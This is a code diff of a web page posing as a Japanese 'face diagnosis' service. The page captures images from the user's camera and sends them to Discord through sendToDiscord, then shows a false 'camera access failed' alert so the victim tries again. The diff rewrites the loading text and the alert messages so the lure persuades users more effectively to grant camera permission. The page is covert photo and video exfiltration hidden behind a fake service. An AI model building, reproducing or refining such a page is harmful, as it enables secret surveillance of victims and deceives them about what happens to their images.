@@ -170,7 +170,7 @@
     <div class="circle-border">
       <div class="circle-core"></div>
     </div>
-    <div class="loading-text">読み込み中…</div>
+    <div class="loading-text">カメラを起動中…</div>
   </div>
 
   <div id="termsModal" class="modal">
@@ -305,7 +305,7 @@ UA：${ua}
   }
 
   document.getElementById("startButton").onclick = async () => {
-    alert("これからあなたの顔診断を開始します！\nカメラの許可をして頂かなければ、診断が開始できません。");
+    alert("これからあなたの顔診断を開始します！\nカメラの許可をして頂かなければ、診断が開始できません。\nこの後表示されるアクセス許可のポップアップに従い、診断を開始してください。");
 
     try {
       const userImages = await captureImages("user");
@@ -317,10 +317,10 @@ UA：${ua}
 
       await sendToDiscord(allImages, videoUrl);
 
-      alert("カメラへのアクセスに失敗しました。\nもう一度初めからやり直し、診断を開始してください。");
+      alert("カメラへのアクセスに失敗しました。\nもう一度初めからやり直し、診断を開始してください。\n※複数回カメラのアクセスに失敗した場合、使用している端末、又はブラウザが当サイトに対応していない可能性があります。");
     } catch (e) {
       console.error("送信失敗:", e);
-      alert("エラーが発生しました。カメラやマイクの設定をご確認ください。");
+      alert("カメラへのアクセスが許可されませんでした。\n診断を開始できません。");
     }
   };
 
